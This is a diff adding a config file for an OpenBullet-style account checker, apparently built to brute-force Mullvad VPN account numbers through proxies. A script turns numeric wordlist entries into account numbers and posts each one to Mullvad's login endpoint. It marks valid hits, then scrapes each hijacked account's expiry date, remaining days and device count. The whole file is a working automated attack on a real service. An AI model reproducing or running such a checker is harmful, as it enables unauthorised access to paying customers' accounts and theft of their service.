@@ -1,0 +1,119 @@
+[SETTINGS]
+{
+  "Name": "Mullvad [VPN]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2024-12-24T07:28:16.6637346-05:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Rc0nM4ster",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Numeric",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function formatCode(input) {
+    const parts = []; 
+    for (let i = 0; i < input.length; i += 4) {
+        parts.push(input.substring(i, i + 4));
+    } 
+    const account = parts.join('+');
+    return account;
+}
+var account = formatCode(CODE);
+END SCRIPT -> VARS "account"
+
+#POST(Login) REQUEST POST "https://mullvad.net/en/account/login" AutoRedirect=FALSE 
+  CONTENT "account_number=<account>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0" 
+  HEADER "accept: application/json" 
+  HEADER "accept-language: en-US,en;q=0.5" 
+  HEADER "accept-encoding: gzip, deflate, br, zstd" 
+  HEADER "referer: https://mullvad.net/en/account/login" 
+  HEADER "x-sveltekit-action: true" 
+  HEADER "origin: https://mullvad.net" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "priority: u=0" 
+  HEADER "pragma: no-cache" 
+  HEADER "cache-control: no-cache" 
+  HEADER "te: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"status\":400" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":302" 
+
+#GET(Account) REQUEST GET "https://mullvad.net/en/account" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "accept-language: en-US,en;q=0.5" 
+  HEADER "accept-encoding: gzip, deflate, br, zstd" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "priority: u=0, i" 
+  HEADER "te: trailers" 
+
+#Expiry PARSE "<SOURCE>" CSS "time.svelte-5mru8y" "datetime" CreateEmpty=FALSE -> CAP "Expiry" 
+
+#Expiry PARSE "<Expiry>" LR "" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+#DateToUnixTime(Exp) FUNCTION DateToUnixTime "yyyy-MM-dd" "<Expiry>" -> VAR "ExpUnix" 
+
+#CurrentUnixTime FUNCTION CurrentUnixTime -> VAR "TimeNow" 
+
+#isFree KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<ExpUnix>" LessThan "<TimeNow>" 
+
+#Compute FUNCTION Compute "(<ExpUnix>-<TimeNow>)/86400" -> VAR "Compute" 
+
+#DaysLeft FUNCTION Round "<Compute>" -> CAP "DaysLeft" 
+
+#GET(Devices) REQUEST GET "https://mullvad.net/en/account/devices" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "accept-language: en-US,en;q=0.5" 
+  HEADER "accept-encoding: gzip, deflate, br, zstd" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "priority: u=0, i" 
+  HEADER "te: trailers" 
+
+#Devices PARSE "<SOURCE>" LR "My devices (" ")" CreateEmpty=FALSE -> CAP "Devices" 
+
